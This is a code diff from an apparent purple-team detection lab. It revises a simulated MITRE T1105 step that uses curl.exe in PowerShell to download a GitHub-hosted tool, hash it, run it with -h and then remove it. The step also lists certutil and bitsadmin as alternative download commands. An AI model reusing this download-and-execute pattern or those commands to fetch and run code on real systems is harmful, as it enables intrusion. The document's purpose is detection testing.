@@ -75,24 +75,38 @@ injects = []
 # 0. Ingress tool transfer (T1105) — pull the wld tool-under-test onto the host (FIRST)
 injects.append(make_inject("ingress",
  "Ingress Tool Transfer — pull the wld tool onto the host (T1105)",
- "First step of the chain: fetch the tool-under-test. curl.exe downloads the wld.exe binary from "
- "the project's GitHub and runs `wld -h` (benign — prints usage) to prove download+execute, then "
- "cleanup removes it. Detection: curl.exe writing a PE to disk and a new process spawning from it "
- "(proxy/NDR tool transfer; EDR exec-after-download).",
+ "First step of the chain: fetch the tool-under-test. curl.exe downloads wld-windows-x86_64.exe "
+ "from the v0.1.0 GitHub Release, saves it as wld.exe, verifies it (SHA256 + file size) and runs "
+ "`wld -h` (benign — prints usage) to prove download+execute, then cleanup removes it. Detection: "
+ "curl.exe writing wld.exe to disk and a new process spawning from it (proxy/NDR tool transfer; "
+ "EDR exec-after-download).",
  "Ingress tool transfer (wld)",
- "$url = 'https://raw.githubusercontent.com/s4nntysec/wetland/main/dist/release/wld-windows-x86_64.exe'\n"
- "# (swap to a Release once published: .../releases/latest/download/wld-windows-x86_64.exe)\n"
- "$dst = Join-Path $env:TEMP 'wetland-lab-wld.exe'\n"
+ "# WETLAND-LAB  T1105 ingress tool transfer — pull wld from the GitHub Release, rename to wld.exe\n"
+ "$url = 'https://github.com/s4nntysec/wetland/releases/download/v0.1.0/wld-windows-x86_64.exe'\n"
+ "$dst = Join-Path $env:TEMP 'wld.exe'\n"
+ "$ok  = $false\n"
  "try {\n"
  "  curl.exe -fsSL -o $dst $url\n"
  "  if (Test-Path $dst) {\n"
- "    Write-Output \"WETLAND-LAB ingress: downloaded wld.exe via curl.exe -> $dst (T1105)\"\n"
- "    & $dst -h 2>&1 | Select-Object -First 2\n"
- "  } else { Write-Output 'WETLAND-LAB ingress: no file written (proxy/AV?) — valid detection' }\n"
- "} catch { Write-Output 'WETLAND-LAB ingress: download blocked by proxy/AV — valid detection' }\n"
- "Write-Output 'detect: curl.exe writing a PE to disk then executing it; proxy/NDR tool transfer; EDR exec-after-download'\n"
- "Write-Output 'alt LOLBins: certutil -urlcache -f <url> <out> ; bitsadmin /transfer'\n",
- "Remove-Item (Join-Path $env:TEMP 'wetland-lab-wld.exe') -Force -ErrorAction SilentlyContinue\n"
+ "    $ok = $true\n"
+ "    $sz = (Get-Item $dst).Length\n"
+ "    $sha = (Get-FileHash $dst -Algorithm SHA256).Hash\n"
+ "    Write-Output \"WETLAND-LAB ingress: downloaded wld-windows-x86_64.exe -> $dst as wld.exe ($sz bytes) (T1105)\"\n"
+ "    Write-Output \"WETLAND-LAB ingress: SHA256 $sha\"\n"
+ "  } else {\n"
+ "    Write-Output 'WETLAND-LAB ingress: no file written (proxy/AV blocked the download?) — valid detection'\n"
+ "  }\n"
+ "} catch {\n"
+ "  Write-Output \"WETLAND-LAB ingress: download failed/blocked ($($_.Exception.Message)) — valid detection\"\n"
+ "}\n"
+ "# test the downloaded tool (benign: -h just prints usage and exits; no C2)\n"
+ "if ($ok) {\n"
+ "  Write-Output 'WETLAND-LAB ingress: testing wld.exe -h ...'\n"
+ "  & $dst -h 2>&1 | Select-Object -First 4 | ForEach-Object { Write-Output \"  $_\" }\n"
+ "}\n"
+ "Write-Output 'detect: curl.exe writing wld.exe to disk then executing it; proxy/NDR tool transfer; EDR exec-after-download'\n"
+ "Write-Output 'alt LOLBins to test: certutil -urlcache -f <url> <out> ; bitsadmin /transfer'\n",
+ "Remove-Item (Join-Path $env:TEMP 'wld.exe') -Force -ErrorAction SilentlyContinue\n"
  "Write-Output 'WETLAND-LAB ingress: cleaned'\n",
  [ap("T1105","Ingress Tool Transfer")], 0))
 
